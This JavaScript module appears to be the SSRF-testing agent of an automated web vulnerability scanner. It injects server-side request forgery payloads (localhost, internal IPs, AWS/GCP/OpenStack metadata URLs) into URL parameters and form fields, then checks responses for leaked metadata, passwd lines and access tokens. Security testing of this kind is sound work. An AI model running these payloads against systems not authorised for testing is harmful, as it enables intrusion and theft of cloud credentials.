const BaseAgent = require('./baseAgent');
const { timedRequest } = require('../utils/httpClient');
const ValidationEngine = require('../engine/validationEngine');
const { URL } = require('url');
const { appendParam } = require('../utils/urlHelper');

const SSRF_TIMEOUT = 10000;

class SSRFAgent extends BaseAgent {
    constructor(logger, memory, findingsStore) {
        super('SSRFAgent', 'A10 - SSRF', logger, memory, findingsStore);
        this.validator = new ValidationEngine(logger);
    }

    async execute(target) {
        const findings = [];
        const { parameters, forms } = this.memory.attackSurface;

        const urlParams = parameters.filter(p =>
            /url|link|href|redirect|next|return|goto|dest|target|path|file|page|load|fetch|src|uri/i.test(p.param)
        );

        this.logger.info(`[SSRFAgent] Found ${urlParams.length} URL-like parameters to test`);

        const seen = new Set();
        for (const param of urlParams) {
            const key = `${param.url}-${param.param}`;
            if (seen.has(key)) continue;
            seen.add(key);
            if (seen.size > 20) break; // Relaxed limit
            try {
                const result = await this._testSSRF(param.url, param.param);
                findings.push(...result);
            } catch (err) {
                this.logger.debug(`[SSRFAgent] Error testing ${param.param}: ${err.message}`);
            }
        }

        // Test non-obvious parameters if we haven't hit many targets
        if (seen.size < 10) {
            for (const param of parameters.slice(0, 30)) {
                if (seen.has(`${param.url}-${param.param}`)) continue;
                if (seen.size > 30) break;
                try {
                    const result = await this._testSSRF(param.url, param.param);
                    findings.push(...result);
                    seen.add(`${param.url}-${param.param}`);
                } catch (_) { }
            }
        }

        for (const form of forms.slice(0, 10)) { // Relaxed limit
            const urlInputs = form.inputs.filter(i => /url|link|href|redirect|src|path|file|fetch/i.test(i.name));
            for (const input of urlInputs.slice(0, 3)) {
                try {
                    const result = await this._testFormSSRF(form.action, input.name, form.method);
                    findings.push(...result);
                } catch (_) { }
            }
        }

        return findings;
    }

    async _testSSRF(url, paramName) {
        const findings = [];
        let baselineResponse;
        try { baselineResponse = await timedRequest(url, { timeout: SSRF_TIMEOUT }); } catch { return findings; }
        const baseline = this.validator.captureBaseline(baselineResponse);

        const payloads = [
            { value: 'http://127.0.0.1', type: 'localhost' },
            { value: 'http://169.254.169.254/latest/meta-data/', type: 'AWS metadata' },
            { value: 'http://[::1]', type: 'IPv6 localhost' },
            { value: 'http://metadata.google.internal/computeMetadata/v1/', type: 'GCP metadata' },
            { value: 'http://10.0.0.1', type: 'Internal IP' },
            { value: 'http://192.168.1.1', type: 'Internal IP' },
            { value: 'http://instance-data/latest/meta-data/', type: 'OpenStack metadata' }
        ];

        for (const payload of payloads) {
            try {
                const testUrl = appendParam(url, paramName, payload.value);
                const testResponse = await timedRequest(testUrl, { timeout: SSRF_TIMEOUT });
                const comparison = this.validator.compareResponses(baseline, testResponse);

                if (comparison.bodyChanged && (comparison.anomalyScore > 0.3 || testResponse.status !== baselineResponse.status)) {
                    const body = typeof testResponse.data === 'string' ? testResponse.data : JSON.stringify(testResponse.data || '');
                    const internalIndicators = [/ami-id/i, /instance-id/i, /local-ipv4/i, /root:|daemon:/i, /SSH-/i, /computeMetadata/i, /"access_token"/i, /"iam"/i];
                    const matched = internalIndicators.filter(p => p.test(body));

                    this.addFinding({
                        type: 'SSRF',
                        endpoint: url,
                        parameter: paramName,
                        description: `Potential SSRF via parameter "${paramName}" targeting ${payload.type}`,
                        evidence: `Response changed when pointing to ${payload.value}. Anomaly: ${comparison.anomalyScore}${matched.length > 0 ? '. Internal data indicators detected.' : ''}`,
                        payload: payload.value,
                        confidenceScore: matched.length > 0 ? 0.9 : 0.5,
                        impact: 'Access to internal services, cloud metadata theft, internal network scanning',
                        reproductionSteps: [
                            `1. Send request to: ${testUrl}`,
                            `2. The parameter "${paramName}" is set to: ${payload.value}`,
                            `3. Observe: the response content/status changes compared to normal requests, indicating server-side fetching`,
                        ],
                    });
                    findings.push({ type: 'SSRF', endpoint: url, parameter: paramName });
                    break;
                }
            } catch (_) { }
        }
        return findings;
    }

    async _testFormSSRF(action, inputName, method) {
        const findings = [];
        const payloads = ['http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/'];
        for (const payload of payloads) {
            try {
                const data = method === 'POST' ? { [inputName]: payload } : undefined;
                const params = method === 'GET' ? { [inputName]: payload } : undefined;
                const response = await timedRequest(action, { method, data, params, timeout: SSRF_TIMEOUT });
                const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');

                if (body.length > 0 && /localhost|127\.0\.0\.1|internal|root:|daemon:|computeMetadata/i.test(body)) {
                    this.addFinding({
                        type: 'SSRF',
                        endpoint: action,
                        parameter: inputName,
                        description: `Potential SSRF via form field "${inputName}"`,
                        evidence: `Response contains localhost/internal references when submitting ${payload}`,
                        payload,
                        confidenceScore: 0.8,
                        impact: 'Internal network access, sensitive data exposure',
                        reproductionSteps: [
                            `1. Navigate to the form at: ${action}`,
                            `2. Enter "${payload}" in the "${inputName}" field`,
                            `3. Submit the form using ${method}`,
                            `4. Observe: the response contains internal system indicators`,
                        ],
                    });
                    findings.push({ type: 'SSRF', endpoint: action, parameter: inputName });
                    break;
                }
            } catch (_) { }
        }
        return findings;
    }
}

module.exports = SSRFAgent;
